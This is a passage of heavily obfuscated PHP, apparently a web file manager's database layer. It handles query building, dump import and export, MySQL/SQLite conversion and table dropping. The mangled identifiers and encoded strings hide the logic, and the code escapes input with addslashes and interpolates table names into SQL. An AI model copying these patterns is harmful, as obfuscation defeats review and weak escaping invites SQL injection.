(isset($Õô”„[$éş™Ú¥Á[430]])) { if (strpos($Õô”„[$éş™Ú¥Á[430]], $éş™Ú¥Á[50])) { list($®»——´, $ä®÷¨) = explode($éş™Ú¥Á[50], $Õô”„[$éş™Ú¥Á[430]]); } else { $®»——´ = $Õô”„[$éş™Ú¥Á[430]]; } $®»——´ = $®»——´ ? $®»——´ : 1; $ä®÷¨ = isset($ä®÷¨) ? $ä®÷¨ : (is_numeric($Õô”„[$éş™Ú¥Á[369]]) ? $Õô”„[$éş™Ú¥Á[369]] : 20); $¬ŸÕÇÑĞ = $ä®÷¨ * ((int) $®»——´ - 1); $Õô”„[$éş™Ú¥Á[369]] = $¬ŸÕÇÑĞ . $éş™Ú¥Á[50] . $ä®÷¨; } if (think_config($éş™Ú¥Á[1132])) { $§íÌÔ½¹ = $éş™Ú¥Á[1133] . md5(serialize($Õô”„)); $şÆº¡ÛÍ = think_cache($§íÌÔ½¹); if ($şÆº¡ÛÍ) { return $şÆº¡ÛÍ; } } $·øá´é‚ = $this->parseSql($this->selectSql, $Õô”„); $·øá´é‚ .= $this->parseLock(isset($Õô”„[$éş™Ú¥Á[925]]) ? $Õô”„[$éş™Ú¥Á[925]] : !1); if (isset($§íÌÔ½¹)) { think_cache($§íÌÔ½¹, $·øá´é‚); } return $·øá´é‚; } public function parseSql($éÊ›î¾‚, $šÕº§‰¬ = array()) { $¨»€ÙÚá =& $_SERVER[†ûãı«°]; $éÊ›î¾‚ = str_replace(array($¨»€ÙÚá[1134], $¨»€ÙÚá[1135], $¨»€ÙÚá[1136], $¨»€ÙÚá[1137], $¨»€ÙÚá[1138], $¨»€ÙÚá[1139], $¨»€ÙÚá[1140], $¨»€ÙÚá[1141], $¨»€ÙÚá[1142], $¨»€ÙÚá[1143], $¨»€ÙÚá[1144]), array($this->parseTable("{$šÕº§‰¬[$¨»€ÙÚá[358]]}"), $this->parseDistinct(isset($šÕº§‰¬[$¨»€ÙÚá[1145]]) ? $šÕº§‰¬[$¨»€ÙÚá[1145]] : !1), $this->parseField(!empty($šÕº§‰¬[$¨»€ÙÚá[352]]) ? $šÕº§‰¬[$¨»€ÙÚá[352]] : $¨»€ÙÚá[222]), $this->parseJoin(!empty($šÕº§‰¬[$¨»€ÙÚá[361]]) ? $šÕº§‰¬[$¨»€ÙÚá[361]] : $¨»€ÙÚá[12]), $this->parseWhere(!empty($šÕº§‰¬[$¨»€ÙÚá[354]]) ? $šÕº§‰¬[$¨»€ÙÚá[354]] : $¨»€ÙÚá[12]), $this->parseGroup(!empty($šÕº§‰¬[$¨»€ÙÚá[582]]) ? $šÕº§‰¬[$¨»€ÙÚá[582]] : $¨»€ÙÚá[12]), $this->parseHaving(!empty($šÕº§‰¬[$¨»€ÙÚá[1146]]) ? $šÕº§‰¬[$¨»€ÙÚá[1146]] : $¨»€ÙÚá[12]), $this->parseOrder(!empty($šÕº§‰¬[$¨»€ÙÚá[443]]) ? $šÕº§‰¬[$¨»€ÙÚá[443]] : $¨»€ÙÚá[12]), $this->parseLimit(!empty($šÕº§‰¬[$¨»€ÙÚá[369]]) ? $šÕº§‰¬[$¨»€ÙÚá[369]] : $¨»€ÙÚá[12]), $this->parseUnion(!empty($šÕº§‰¬[$¨»€ÙÚá[424]]) ? $šÕº§‰¬[$¨»€ÙÚá[424]] : $¨»€ÙÚá[12]), $this->parseComment(!empty($šÕº§‰¬[$¨»€ÙÚá[431]]) ? $šÕº§‰¬[$¨»€ÙÚá[431]] : $¨»€ÙÚá[12])), $éÊ›î¾‚); return $éÊ›î¾‚; } public function getLastSql($ş½ù’Ò¶ = '') { return $ş½ù’Ò¶ ? $this->modelSql[$ş½ù’Ò¶] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($Ò©€ÌÚ) { return addslashes($Ò©€ÌÚ); } public function setModel($©¹çÑä”) { $this->model = $©¹çÑä”; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($®˜Ú´ÓÅ = array()) { $ˆ¾Ú— =& $_SERVER[†ûãı«°]; if (empty($®˜Ú´ÓÅ)) { $®˜Ú´ÓÅ = $GLOBALS[$ˆ¾Ú—[6]][$ˆ¾Ú—[21]]; } $this->database = $®˜Ú´ÓÅ; } public function model($åüì›ÇŠ = '') { return new ModelBase($åüì›ÇŠ, $_SERVER[†ûãı«°][12], $this->database); } public function db($ÑİŠîş = false) { $Â÷„§ =& $_SERVER[†ûãı«°]; $€Œ†Ë²§ = array_change_key_case($this->database); if ($this->dbType() == $Â÷„§[13] || !$ÑİŠîş) { return $this->model()->db(); } $ç»‘•Ÿ° = $€Œ†Ë²§[$Â÷„§[1060]]; $€Œ†Ë²§[$Â÷„§[1060]] = $Â÷„§[12]; if ($€Œ†Ë²§[$Â÷„§[1055]] == $Â÷„§[1052]) { $ ò§â¼ = $€Œ†Ë²§[$Â÷„§[1061]]; $€Œ†Ë²§[$Â÷„§[1061]] = substr($ ò§â¼, 0, strrpos($ ò§â¼, $Â÷„§[1147])); } $this->database = $€Œ†Ë²§; $ñ‡‰ş×Ô = $this->model()->db(); try { $Üû“ÜÁØ = $ñ‡‰ş×Ô->execute("\x73\150\x6f\x77\40\144\x61\x74\x61\142\141\163\x65\163\40\x6c\151\153\145\x20\47{$ç»‘•Ÿ°}\x27"); } catch (Exception $µ©ùæ¯) { } if (!$Üû“ÜÁØ) { $ñ‡‰ş×Ô->execute("\x63\x72\x65\141\x74\x65\40\x64\x61\164\141\142\x61\x73\145\x20\x60{$ç»‘•Ÿ°}\140"); } $€Œ†Ë²§[$Â÷„§[1060]] = $ç»‘•Ÿ°; if ($€Œ†Ë²§[$Â÷„§[1055]] == $Â÷„§[1052]) { $€Œ†Ë²§[$Â÷„§[1061]] .= $Â÷„§[1147] . $ç»‘•Ÿ°; } $this->database = $€Œ†Ë²§; $ñ‡‰ş×Ô->execute("\x75\x73\x65\40\x60{$ç»‘•Ÿ°}\x60"); return $ñ‡‰ş×Ô; } public function createTable($ö¦Î˜°º, &$…ÍË…Ö¡) { $úĞºó…” =& $_SERVER[†ûãı«°]; if (!IO::exist($ö¦Î˜°º)) { ActionCall($úĞºó…”[1148], !0, 0); show_json(LNG($úĞºó…”[1149]), !1); } $¢©º¿®° = $this->model()->db(); $ı€ºàØß = sqlSplit(IO::getContent($ö¦Î˜°º)); foreach ($ı€ºàØß as $ºû²Éß) { $ù˜´ØüÇ = stripos($ºû²Éß, $úĞºó…”[1150]) === 0; if ($ù˜´ØüÇ) { $…ÍË…Ö¡->task[$úĞºó…”[1151]] += 1; } $¢©º¿®°->execute($ºû²Éß); if ($ù˜´ØüÇ) { preg_match($úĞºó…”[1152], $ºû²Éß, $ù–ÚÇ€); $…ÍË…Ö¡->task[$úĞºó…”[1153]] = $ù–ÚÇ€[1]; $…ÍË…Ö¡->update(1); } } } public function insertTable($ƒ¡øà·, &$’®ë–Š) { $×†‹Üë÷ =& $_SERVER[†ûãı«°]; $æÅ±ûÛ = $this->model()->db(); $äô¿÷„ø = $¾ŒĞ·î½ ? array($¾ŒĞ·î½) : $æÅ±ûÛ->getTables(); foreach ($ƒ¡øà· as $ñˆ‘³ùé) { $¾ŒĞ·î½ = basename($ñˆ‘³ùé, $×†‹Üë÷[866]); if (!in_array($¾ŒĞ·î½, $äô¿÷„ø)) { continue; } $’®ë–Š->task[$×†‹Üë÷[1153]] = $¾ŒĞ·î½; if (get_filesize($ñˆ‘³ùé) == 0) { continue; } $ô‚è£Çˆ = $this->sqlToDb($ñˆ‘³ùé, $’®ë–Š); if (!$ô‚è£Çˆ) { ActionCall($×†‹Üë÷[1148], !0, 0); show_json(LNG($×†‹Üë÷[1154]) . "\x5b{$¾ŒĞ·î½}\135", !1); } } } public function sqlFromDb($Ø¤±Ã±, $ê‚€¸‹°, &$İ‰äÎÏø, $Šƒ¼Ø°… = '') { if ($İ‰äÎÏø) { $İ‰äÎÏø->task[$_SERVER[†ûãı«°][1153]] = $Ø¤±Ã±; } $şÁƒÎé² = $this->model($Ø¤±Ã±); $üèÙ­Èƒ = 0; $ÒÖ¨ÇÜÂ = 0; $•Çˆú—È = 10000; $øƒ½ù˜Ú = fopen($ê‚€¸‹°, $_SERVER[†ûãı«°][1155]); $­Æèø§ä = $şÁƒÎé²->getPk(); $òü‘ƒÅ÷ = $şÁƒÎé²->getDbFields(); $•’ÑÏÔ— = $_SERVER[†ûãı«°][12]; if ($GLOBALS[$_SERVER[†ûãı«°][865]] && in_array($Ø¤±Ã±, array($_SERVER[†ûãı«°][1156], $_SERVER[†ûãı«°][1157]))) { $•’ÑÏÔ— = $Ø¤±Ã±; } do { $€®¾‰ÌÎ = array($­Æèø§ä => array($_SERVER[†ûãı«°][1102], $ÒÖ¨ÇÜÂ)); $ÆïÁö’ = $şÁƒÎé²->where($€®¾‰ÌÎ)->field($òü‘ƒÅ÷)->order($­Æèø§ä . $_SERVER[†ûãı«°][1158])->limit($•Çˆú—È)->select(); $ÆïÁö’ = !empty($ÆïÁö’) ? $ÆïÁö’ : array(); if (!($«¶ôàƒØ = count($ÆïÁö’))) { break; } $§²¯ıã = end($ÆïÁö’); $ÒÖ¨ÇÜÂ = $§²¯ıã[$­Æèø§ä]; $ñá”Õİ = array(); foreach ($ÆïÁö’ as $‹¾®Ï•·) { if ($•’ÑÏÔ—) { if ($Ø¤±Ã± == $_SERVER[†ûãı«°][1156]) { if ($‹¾®Ï•·[$_SERVER[†ûãı«°][33]] == $_SERVER[†ûãı«°][1159]) { $í‹’§¬ = json_decode($‹¾®Ï•·[$_SERVER[†ûãı«°][452]], !0); if ($í‹’§¬[$_SERVER[†ûãı«°][32]] == $GLOBALS[$_SERVER[†ûãı«°][865]] && $í‹’§¬[$_SERVER[†ûãı«°][826]] != 1) { continue; } } } else { if ($‹¾®Ï•·[$_SERVER[†ûãı«°][33]] == $_SERVER[†ûãı«°][1160] && $‹¾®Ï•·[$_SERVER[†ûãı«°][97]] == $_SERVER[†ûãı«°][861]) { continue; } } } if ($Šƒ¼Ø°…) { $‹¾®Ï•·[$_SERVER[†ûãı«°][87]] = "\x7b\x69\x6f\x3a{$Šƒ¼Ø°…}\175" . substr($‹¾®Ï•·[$_SERVER[†ûãı«°][87]], strlen("\x7b\x69\x6f\72{$‹¾®Ï•·[$_SERVER[†ûãı«°][899]]}\175")); $‹¾®Ï•·[$_SERVER[†ûãı«°][899]] = $Šƒ¼Ø°…; } $ñá”Õİ[] = $_SERVER[†ûãı«°][1161] . $this->sqlEncode($‹¾®Ï•·) . $_SERVER[†ûãı«°][1162]; } $×Ãòüä‡ = "\x49\x4e\x53\x45\122\x54\40\x49\116\x54\x4f\x20\x60{$Ø¤±Ã±}\140\x20\50\140" . implode($_SERVER[†ûãı«°][1163], $òü‘ƒÅ÷) . $_SERVER[†ûãı«°][1164]; fwrite($øƒ½ù˜Ú, $×Ãòüä‡ . implode($_SERVER[†ûãı«°][1165], $ñá”Õİ) . $_SERVER[†ûãı«°][74] . PHP_EOL); $üèÙ­Èƒ += $«¶ôàƒØ; if ($İ‰äÎÏø) { $İ‰äÎÏø->update($«¶ôàƒØ); } } while ($•Çˆú—È == $«¶ôàƒØ); fclose($øƒ½ù˜Ú); return $üèÙ­Èƒ; } public function sqlToDb($í³™ıôû, &$íà™èó) { $á¤µ…±Ã =& $_SERVER[†ûãı«°]; $¶ïˆØ‹à = $this->model()->db(); $Ö©íÏŠ­ = @fopen($í³™ıôû, $á¤µ…±Ã[1166]); if (!$Ö©íÏŠ­) { return !1; } $×´™ŠÌ‡ = 0; $¸€£– = $á¤µ…±Ã[12]; $ºàŠ·â½ = array(); $ÌíœÈ‡— = $this->dbType(); $‹Õ«¤éí = $ÌíœÈ‡— == $á¤µ…±Ã[13] ? 500 : 2000; $Ñšã¹´Ù = basename($í³™ıôû, $á¤µ…±Ã[866]); $¡Ô¿½ü = 0; $ËÛ ¹ñ = 4194304; while (!feof($Ö©íÏŠ­)) { $Ë¤’Ïùà = trim(fgets($Ö©íÏŠ­)); if (!$Ë¤’Ïùà) { continue; } $Áú§Áì = $this->sqlDecode($Ë¤’Ïùà, $ÌíœÈ‡—, $Ñšã¹´Ù); if (stripos($Áú§Áì, $á¤µ…±Ã[432]) === 0) { if (!$¸€£–) { $¸€£– = $Áú§Áì . $á¤µ…±Ã[53]; } continue; } if ($íà™èó) { $íà™èó->task[$á¤µ…±Ã[1151]] += 1; } $×´™ŠÌ‡++; $ºàŠ·â½[] = rtrim(rtrim(trim($Áú§Áì), $á¤µ…±Ã[50]), $á¤µ…±Ã[74]); $¼Ä­ÈÁ˜ = null; $–ß¡÷¶ˆ = strlen($Áú§Áì); $¡Ô¿½ü += $–ß¡÷¶ˆ; $æ¦³¶Î = strlen($¸€£–) + $¡Ô¿½ü + (count($ºàŠ·â½) - 1); if ($æ¦³¶Î >= $ËÛ ¹ñ) { $¼Ä­ÈÁ˜ = array_pop($ºàŠ·â½); if ($×´™ŠÌ‡ > 1) { $×´™ŠÌ‡--; } } if ($×´™ŠÌ‡ >= $‹Õ«¤éí || $¼Ä­ÈÁ˜) { $Áú§Áì = $¸€£– . implode($á¤µ…±Ã[50], $ºàŠ·â½); if (!$¶ïˆØ‹à->execute($Áú§Áì)) { return !1; } if ($íà™èó) { $íà™èó->update($×´™ŠÌ‡); } $ºàŠ·â½ = array(); $×´™ŠÌ‡ = 0; $¡Ô¿½ü = 0; if ($¼Ä­ÈÁ˜) { $ºàŠ·â½ = array($¼Ä­ÈÁ˜); $×´™ŠÌ‡ = 1; $¡Ô¿½ü = $–ß¡÷¶ˆ; } } } fclose($Ö©íÏŠ­); if (!empty($ºàŠ·â½)) { $Áú§Áì = $¸€£– . implode($á¤µ…±Ã[50], $ºàŠ·â½); if (!$¶ïˆØ‹à->execute($Áú§Áì)) { return !1; } if ($íà™èó) { $íà™èó->update($×´™ŠÌ‡); } } return !0; } public function dropTable($ˆÃÔÏƒ = null) { $ÈêæÜÓñ = $this->model()->db(); $ØåáØ¹€ = $ˆÃÔÏƒ ? array($ˆÃÔÏƒ) : $ÈêæÜÓñ->getTables(); if (!$ØåáØ¹€) { return; } foreach ($ØåáØ¹€ as $ˆÃÔÏƒ) { if ($ˆÃÔÏƒ) { $ˆÃÔÏƒ = strtolower($ˆÃÔÏƒ); } else { continue; } $ÈêæÜÓñ->execute("\144\162\157\x70\x20\164\141\142\x6c\x65\x20\x69\x66\x20\x65\x78\151\x73\x74\163\x20\x60{$ˆÃÔÏƒ}\140"); } } private function sqlEncode($¶²–½¢) { $Ñğ¤Ü§ë =& $_SERVER[†ûãı«°]; $¤ˆğŸü = array(); foreach ($¶²–½¢ as $›éƒŸ§) { if (is_array($›éƒŸ§)) { $›éƒŸ§ = json_encode_force($›éƒŸ§); } $›éƒŸ§ = addslashes($›éƒŸ§); $›éƒŸ§ = str_replace(array($Ñğ¤Ü§ë[1167], $Ñğ¤Ü§ë[287], $Ñğ¤Ü§ë[419]), array($Ñğ¤Ü§ë[1168], $Ñğ¤Ü§ë[1169], $Ñğ¤Ü§ë[1170]), $›éƒŸ§); $¤ˆğŸü[] = $›éƒŸ§; } return $Ñğ¤Ü§ë[58] . implode($Ñğ¤Ü§ë[1171], $¤ˆğŸü) . $Ñğ¤Ü§ë[58]; } private function sqlDecode($äèó¤¡ç, $ë¨ş¢ŸË, $©Š‘´Üá = '') { $²Ì•İŒÀ =& $_SERVER[†ûãı«°]; $äèó¤¡ç = str_replace(array($²Ì•İŒÀ[1168], $²Ì•İŒÀ[1169], $²Ì•İŒÀ[1170]), array($²Ì•İŒÀ[1167], $²Ì•İŒÀ[287], $²Ì•İŒÀ[419]), $äèó¤¡ç); if ($ë¨ş¢ŸË == $²Ì•İŒÀ[13]) { $äèó¤¡ç = str_ireplace($²Ì•İŒÀ[1172], $²Ì•İŒÀ[59], $äèó¤¡ç); $äèó¤¡ç = stripslashes($äèó¤¡ç); } return preg_replace($²Ì•İŒÀ[1173], $²Ì•İŒÀ[12], $äèó¤¡ç); if ($ë¨ş¢ŸË == $²Ì•İŒÀ[13]) { return $©Š‘´Üá != $²Ì•İŒÀ[860] ? stripslashes($äèó¤¡ç) : $äèó¤¡ç; } if ($©Š‘´Üá == $²Ì•İŒÀ[860]) { $äèó¤¡ç = str_replace($²Ì•İŒÀ[1174], $²Ì•İŒÀ[121], stripslashes($äèó¤¡ç)); } return $äèó¤¡ç; } public function getSqlFile($©‹Ë¬ø× = '') { $Ó×Ö¥Ä =& $_SERVER[†ûãı«°]; $Ö©ìáàš = $this->dbType(!0); $ÎÚãİìÈ = CONTROLLER_DIR . "\x69\156\x73\164\141\154\x6c\x2f\x64\x61\x74\x61\x2f{$Ö©ìáàš}\x2e\163\x71\154"; $ùß´Ç°ó = file_get_contents($ÎÚãİìÈ); $“‰Ø£ˆê = $Ó×Ö¥Ä[1175] . ($Ö©ìáàš == $Ó×Ö¥Ä[884] ? $Ó×Ö¥Ä[1176] : $Ó×Ö¥Ä[1177]) . $Ó×Ö¥Ä[1178]; preg_match_all($“‰Ø£ˆê, $ùß´Ç°ó, $·¦œæßÊ); $Ú¤óÒ Ç = $·¦œæßÊ[1]; $£€ã¤ŒÜ = $this->model()->db(); $ ÂÒÜÙË = $£€ã¤ŒÜ->getTables(); $‚ÆçÔÒê = TEMP_FILES . $Ó×Ö¥Ä[1179] . date($Ó×Ö¥Ä[261]) . $Ó×Ö¥Ä[8]; del_dir($‚ÆçÔÒê); mk_dir($‚ÆçÔÒê); $Ãß«µ© = $‚ÆçÔÒê . $Ó×Ö¥Ä[1180]; $±Ü®´Ù‡ = $‚ÆçÔÒê . $Ó×Ö¥Ä[1181]; $ïÛ˜ä¥ã = $Ö©ìáàš == $Ó×Ö¥Ä[13] ? $Ó×Ö¥Ä[884] : $Ó×Ö¥Ä[13]; IO::copy(CONTROLLER_DIR . "\x69\x6e\163\164\141\x6c\x6c\x2f\144\x61\x74\141\x2f{$ïÛ˜ä¥ã}\56\x73\x71\154", $‚ÆçÔÒê); @touch($‚ÆçÔÒê . $Ö©ìáàš . $Ó×Ö¥Ä[866]); $Ë€€“¹¬ = fopen($Ãß«µ©, $Ó×Ö¥Ä[1155]); $ÓïÉğî = fopen($±Ü®´Ù‡, $Ó×Ö¥Ä[1155]); if ($Ö©ìáàš == $Ó×Ö¥Ä[13]) { $ ÂÒÜÙË = array_diff($ ÂÒÜÙË, array($Ó×Ö¥Ä[858], $Ó×Ö¥Ä[859])); $„Å´ÅÇ‘ = array($Ó×Ö¥Ä[1182], $Ó×Ö¥Ä[1183], $Ó×Ö¥Ä[1184]); fwrite($ÓïÉğî, implode(PHP_EOL, $„Å´ÅÇ‘) . PHP_EOL . PHP_EOL); foreach ($ ÂÒÜÙË as $¸å—„ßÒ) { $‚Õï«íÄ = $this->sqlFromSqlite($¸å—„ßÒ); if (!$‚Õï«íÄ[$Ó×Ö¥Ä[13]]) { continue; } fwrite($ÓïÉğî, $‚Õï«íÄ[$Ó×Ö¥Ä[13]] . PHP_EOL . PHP_EOL); if (!in_array($¸å—„ßÒ, $Ú¤óÒ Ç)) { fwrite($Ë€€“¹¬, $‚Õï«íÄ[$Ó×Ö¥Ä[884]] . PHP_EOL . PHP_EOL); } } } else { foreach ($ ÂÒÜÙË as $¸å—„ßÒ) { $‚Õï«íÄ = $this->sqlFromMysql($¸å—„ßÒ); if (!$‚Õï«íÄ[$Ó×Ö¥Ä[884]]) { continue; } fwrite($Ë€€“¹¬, $‚Õï«íÄ[$Ó×Ö¥Ä[884]] . PHP_EOL . PHP_EOL); if (!in_array($¸å—„ßÒ, $Ú¤óÒ Ç)) { fwrite($ÓïÉğî, $‚Õï«íÄ[$Ó×Ö¥Ä[13]] . PHP_EOL . PHP_EOL); } } } fclose($Ë€€“¹¬); fclose($ÓïÉğî); $ùß´Ç°ó = array($Ó×Ö¥Ä[884] => $Ãß«µ©, $Ó×Ö¥Ä[13] => $±Ü®´Ù‡); return $©‹Ë¬ø× ? $ùß´Ç°ó[$©‹Ë¬ø×] : $ùß´Ç°ó; } public function dbType($ÑÈÙğ¾Ì = false) { $‰ÔÌÓ =& $_SERVER[†ûãı«°]; $ı£¬Úï = $ÑÈÙğ¾Ì ? $GLOBALS[$‰ÔÌÓ[6]][$‰ÔÌÓ[21]] : $this->database; $ı£¬Úï = array_change_key_case($ı£¬Úï); $š¥ ÛÏ© = $ı£¬Úï[$‰ÔÌÓ[1055]]; if ($š¥ ÛÏ© == $‰ÔÌÓ[1052]) { $…ôš³÷‰ = explode($‰ÔÌÓ[4], $ı£¬Úï[$‰ÔÌÓ[1061]]); $š¥ ÛÏ© = $…ôš³÷‰[0]; } $Ÿæ¡š‰Ú = array($‰ÔÌÓ[1185] => $‰ÔÌÓ[13], $‰ÔÌÓ[1000] => $‰ÔÌÓ[884]); if (isset($Ÿæ¡š‰Ú[$š¥ ÛÏ©])) { $š¥ ÛÏ© = $Ÿæ¡š‰Ú[$š¥ ÛÏ©]; } return $š¥ ÛÏ©; } public function sqlFromMysql($”‰˜Ò”, $Æˆïêô’ = '') { $§°şïÃÑ =& $_SERVER[†ûãı«°]; $Âé™šìß = $this->model()->db(); $Òº›À½Ú = $Âé™šìß->query($§°şïÃÑ[1186] . $”‰˜Ò” . $§°şïÃÑ[463]); if (!$Òº›À½Ú || !$Òº›À½Ú[0]) { return !1; } $ìÇ¸ñö¤ = _get($Òº›À½Ú[0], $§°şïÃÑ[1187], $§°şïÃÑ[12]); if (!$ìÇ¸ñö¤) { return !1; } $’µ›Í³‹ = "\x44\x52\x4f\120\x20\124\101\102\x4c\105\40\111\x46\x20\105\x58\111\x53\124\123\x20\140{$”‰˜Ò”}\x60\x3b" . PHP_EOL . $ìÇ¸ñö¤ . $§°şïÃÑ[74]; if ($Æˆïêô’ && $Æˆïêô’ == $§°şïÃÑ[884]) { return $’µ›Í³‹; } $»ŸÚÇ‘É = array_change_key_case($GLOBALS[$§°şïÃÑ[6]][$§°şïÃÑ[21]]); $¦¢¤­İí = $»ŸÚÇ‘É[$§°şïÃÑ[1060]]; $íµÕá¢¬ = $§°şïÃÑ[1188] . $¦¢¤­İí . $§°şïÃÑ[1189] . $”‰˜Ò” . $§°şïÃÑ[58]; $•óËŒÜ = $§°şïÃÑ[1190] . $”‰˜Ò” . $§°şïÃÑ[988]; $¡™äÚ®š = $Âé™šìß->query($íµÕá¢¬); if (empty($¡™äÚ®š)) { $ÄÜÛ¥°ã = array($§°şïÃÑ[884] => $§°şïÃÑ[12], $§°şïÃÑ[13] => $§°şïÃÑ[12]); return $Æˆïêô’ ? $ÄÜÛ¥°ã[$Æˆïêô’] : $ÄÜÛ¥°ã; } $êëŒ±¶÷ = $Âé™šìß->query($•óËŒÜ); $¬²«êÖ… = $§°şïÃÑ[12]; $ËÉûïˆç = array(); foreach ($êëŒ±¶÷ as $„ÇÖ›‡”) { if (!$¬²«êÖ… && $„ÇÖ›‡”[$§°şïÃÑ[1191]] == $§°şïÃÑ[1192]) { $¬²«êÖ… = $„ÇÖ›‡”[$§°şïÃÑ[1193]]; } if (isset($ËÉûïˆç[$„ÇÖ›‡”[$§°şïÃÑ[1191]]])) { $ËÉûïˆç[$„ÇÖ›‡”[$§°şïÃÑ[1191]]][$§°şïÃÑ[1194]][] = $„ÇÖ›‡”[$§°şïÃÑ[1193]]; continue; } $ËÉûïˆç[$„ÇÖ›‡”[$§°şïÃÑ[1191]]] = array($§°şïÃÑ[1195] => $„ÇÖ›‡”[$§°şïÃÑ[1191]], $§°şïÃÑ[1194] => array($„ÇÖ›‡”[$§°şïÃÑ[1193]]), $§°şïÃÑ[1196] => $„ÇÖ›‡”[$§°şïÃÑ[1197]] == $§°şïÃÑ[91] ? 0 : 1); } $¡ğíÏ = array(); foreach ($ËÉûïˆç as $„ÇÖ›‡”) { $ĞËá»®¹ = $„ÇÖ›‡”[$§°şïÃÑ[1195]] == $§°şïÃÑ[1192]; $«×ÌÖ¢± = array($§°şïÃÑ[1198], $„ÇÖ›‡”[$§°şïÃÑ[1196]] == $§°şïÃÑ[91] && !$ĞËá»®¹ ? $§°şïÃÑ[1199] : $§°şïÃÑ[12], $§°şïÃÑ[1200], $§°şïÃÑ[1201] . $”‰˜Ò” . $§°şïÃÑ[11] . ($ĞËá»®¹ ? $§°şïÃÑ[1202] : $„ÇÖ›‡”[$§°şïÃÑ[1195]]) . $§°şïÃÑ[121], $§°şïÃÑ[1203], $§°şïÃÑ[121] . $”‰˜Ò” . $§°şïÃÑ[121], $§°şïÃÑ[1204] . implode($§°şïÃÑ[1205], $„ÇÖ›‡”[$§°şïÃÑ[1194]]) . $§°şïÃÑ[1206]); $¡ğíÏ[] = implode($§°şïÃÑ[53], $«×ÌÖ¢±) . $§°şïÃÑ[74]; } $´î°¢ØË = array(); $ÒÑ·÷İ© = array($§°şïÃÑ[1207] => $§°şïÃÑ[1208], $§°şïÃÑ[1208] => $§°şïÃÑ[1208], $§°şïÃÑ[365] => $§°şïÃÑ[392], $§°şïÃÑ[364] => $§°şïÃÑ[392]); foreach ($¡™äÚ®š as $„ÇÖ›‡”) { $«×ÌÖ¢± = array($§°şïÃÑ[121] . $„ÇÖ›‡”[$§°şïÃÑ[1209]] . $§°şïÃÑ[121], isset($ÒÑ·÷İ©[$„ÇÖ›‡”[$§°şïÃÑ[1210]]]) ? $ÒÑ·÷İ©[$„ÇÖ›‡”[$§°şïÃÑ[1210]]] : $„ÇÖ›‡”[$§°şïÃÑ[1211]], $„ÇÖ›‡”[$§°şïÃÑ[1212]] == $§°şïÃÑ[986] ? $§°şïÃÑ[1213] : $§°şïÃÑ[1214], $„ÇÖ›‡”[$§°şïÃÑ[1209]] == $¬²«êÖ… ? $§°şïÃÑ[1215] : $§°şïÃÑ[12], $„ÇÖ›‡”[$§°şïÃÑ[1037]] ? strtoupper(str_replace($§°şïÃÑ[11], $§°şïÃÑ[12], $„ÇÖ›‡”[$§°şïÃÑ[1037]])) : $§°şïÃÑ[12]); $´î°¢ØË[] = trim(implode($§°şïÃÑ[53], $«×ÌÖ¢±)); } $õØ‹±÷ = array($§°şïÃÑ[1216] . $”‰˜Ò” . $§°şïÃÑ[1217], $§°şïÃÑ[1218] . $”‰˜Ò” . $§°şïÃÑ[1219], implode($§°şïÃÑ[50] . PHP_EOL, $´î°¢ØË), $§°şïÃÑ[1034]); $ŞåŸúüğ = implode(PHP_EOL, array_merge($õØ‹±÷, $¡ğíÏ)); if ($Æˆïêô’ && $Æˆïêô’ == $§°şïÃÑ[13]) { return $ŞåŸúüğ; } $ÄÜÛ¥°ã = array($§°şïÃÑ[884] => $’µ›Í³‹, $§°şïÃÑ[13] => $ŞåŸúüğ); return $Æˆïêô’ ? $ÄÜÛ¥°ã[$Æˆïêô’] : $ÄÜÛ¥°ã; } public function sqlFromSqlite($¨Ìş¸’à, $úü“³çÑ = '') { $ÄÌòÒ”‹ =& $_SERVER[†ûãı«°]; $ÃµŒè± = $this->model()->db(); $ëÉ•¨Óá = "\120\122\101\x47\115\x41\40\124\x41\102\114\x45\137\x49\x4e\x46\x4f\40\50\x27{$¨Ìş¸’à}\47\x29"; $±ßÒ†ÉÔ = "\x53\105\114\x45\x43\x54\x20\x2a\x20\x46\x52\x4f\x4d\40\x73\161\x6c\x69\164\x65\137\x6d\141\163\x74\x65\x72\40\127\110\105\122\x45\40\164\142\154\x5f\x6e\141\155\x65\40\x3d\40\x27{$¨Ìş¸’à}\47"; $€è½ù = $ÃµŒè±->query($ëÉ•¨Óá); if (empty($€è½ù)) { $’ëúĞŠı = array($ÄÌòÒ”‹[884] => $ÄÌòÒ”‹[12], $ÄÌòÒ”‹[13] => $ÄÌòÒ”‹[12]); return $úü“³çÑ ? $’ëúĞŠı[$úü“³çÑ] : $’ëúĞŠı; } $ÅÎö‚™ß = $ÃµŒè±->query($±ßÒ†ÉÔ); $ïÜÖ¹–Ğ = $øû‚¾ª¼ = array(); foreach ($ÅÎö‚™ß as $‚ã‡ãƒ­) { if ($‚ã‡ãƒ­[$ÄÌòÒ”‹[33]] == $ÄÌòÒ”‹[358]) { $ïÜÖ¹–Ğ[] = $‚ã‡ãƒ­[$ÄÌòÒ”‹[1220]]; } else { $øû‚¾ª¼[$‚ã‡ãƒ­[$ÄÌòÒ”‹[32]]] = $‚ã‡ãƒ­[$ÄÌòÒ”‹[1220]]; } } $§ıîé­ñ = array_merge(array($ÄÌòÒ”‹[1216] . $¨Ìş¸’à . $ÄÌòÒ”‹[121]), $ïÜÖ¹–Ğ, array_values($øû‚¾ª¼)); $§ıîé­ñ = implode($ÄÌòÒ”‹[74] . PHP_EOL, $§ıîé­ñ) . $ÄÌòÒ”‹[74]; if ($úü“³çÑ && $úü“³çÑ == $ÄÌòÒ”‹[13]) { return $§ıîé­ñ; } $£ˆïŒñş = array(); foreach ($øû‚¾ª¼ as $ùí¯‰Û => $ÏĞÂµ­Ï) { $Ä¾•Œ«í = str_replace($ÄÌòÒ”‹[1221] . $¨Ìş¸’à . $ÄÌòÒ”‹[11], $ÄÌòÒ”‹[12], $ùí¯‰Û); $Ä¾•Œ«í = str_replace($¨Ìş¸’à . $ÄÌòÒ”‹[11], $ÄÌòÒ”‹[12], $ùí¯‰Û); $ÍìÃáÈ = str_replace(array($ÄÌòÒ”‹[121], $ÄÌòÒ”‹[1045]), $ÄÌòÒ”‹[463], substr($ÏĞÂµ­Ï, stripos($ÏĞÂµ­Ï, $ÄÌòÒ”‹[339]))); $£ˆïŒñş[$Ä¾•Œ«í] = $ÍìÃáÈ; } $ÅùÃ¶ëé = array(); $™¾Ãš™ = array($ÄÌòÒ”‹[1208] => $ÄÌòÒ”‹[1222], 